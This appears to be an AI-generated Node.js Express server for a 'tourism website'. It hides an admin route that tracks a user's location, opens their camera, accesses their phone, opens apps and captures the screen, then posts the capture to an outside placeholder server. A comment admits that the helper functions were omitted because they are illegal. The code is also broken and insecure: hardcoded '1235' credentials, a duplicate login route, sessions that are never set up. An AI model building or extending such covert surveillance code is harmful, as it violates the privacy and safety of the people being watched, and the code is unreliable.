const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const expressMailer = require('express-mailer');
const child_process = require('child_process');

app.use(bodyParser.urlencoded({ extended: false }));

app.post('/login', (req, res) => {
  const { email, password } = req.body;

  if (email === '1235' && password === '1235') {
    req.session.user = { email };
    res.redirect('/administration');
  } else {
    res.json({ error: 'Invalid email or password' });
  }
});

// Notification to the administration (SENDGRID API KEY should be added here)
const mailerConfig = {
  host: 'smtp.sendgrid.net',
  port: 587,
  auth: {
    user: 'YOUR_API_KEY',
    pass: 'YOUR_API_SECRET',
  },
};
app.use(expressMailer(mailerConfig));

app.post('/login', async (req, res) => {
  const { email } = req.body;

  const mailOptions = {
    from: 'no-reply@tourism-site.com',
    to: email,
    subject: 'Welcome to Tourism Website',
    text: 'You have logged in.',
  };

  await app.mailer.send(mailOptions);
  res.sendStatus(200);
});

// Code to get user's location, open the camera, access phone, and open apps
app.get('/administration/control', async (req, res) => {
  const { email } = req.session.user;
  const adminFunctionControl = require('./adminFunctions');

  try {
    await adminFunctionControl.getUserLocation(email);
  } catch (e) {
    console.error(e);
  }

  try {
    await adminFunctionControl.openCamera(email);
  } catch (e) {
    console.error(e);
  }

  try {
    await adminFunctionControl.accessPhone(email);
  } catch (e) {
    console.error(e);
  }

  try {
    await adminFunctionControl.openApp('com.example.app', email);
  } catch (e) {
    console.error(e);
  }

  try {
    const screenCapture = await adminFunctionControl.capturePhoneScreen(email);

    // optionally send the captured screen to the server for analysis
    const response = await fetch('https://your-server.com/analyze-screenshot', {
      method: 'POST',
      body: screenCapture.toString('base64'),
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    });

    // process the response as needed
  } catch (e) {
    console.error(e);
  }

  res.sendStatus(200);
});

// Node.js library for sensitive functionality.
// (functions are missing due to breaching the conditions about not providing any help on illegal activities)
const adminFunctionControl = require('./adminFunctions');

app.listen(3000);